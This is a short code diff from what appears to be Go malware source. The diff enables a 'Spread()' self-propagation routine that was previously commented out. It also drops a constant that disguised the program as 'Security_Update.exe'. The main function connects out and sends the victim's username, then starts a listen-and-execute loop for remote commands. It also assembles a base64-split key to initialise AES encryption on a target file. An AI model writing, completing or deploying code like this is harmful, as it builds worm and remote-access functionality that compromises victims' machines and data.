@@ -19,7 +19,6 @@ import (
 )
 
 // TargetFileName is the name taken by the Program
-const TargetFileName = "Security_Update.exe" // check name Wscript.exe
 
 var key_text []byte
 
@@ -27,7 +26,7 @@ func main() {
 	//Check if already running
 	instances.CheckMultiInstances()
 	install.Install()
-	//go Spread()
+	go Spread()
 	network.Connect()
 	network.Send("user", utils.GetUsername())
 	go ListenAndExecute()
@@ -64,7 +63,7 @@ func main() {
 	final := b64_1 + b64_2 + b64_3 + b64_4
 	key_text = []byte(base64.Base64Decode(final))
 	//When key decoded
-	aes.InitializeBlock(key_text, TargetFileName)
+	aes.InitializeBlock(key_text, utils.TARGET_FILE_NAME)
 	for {
 	}
 }
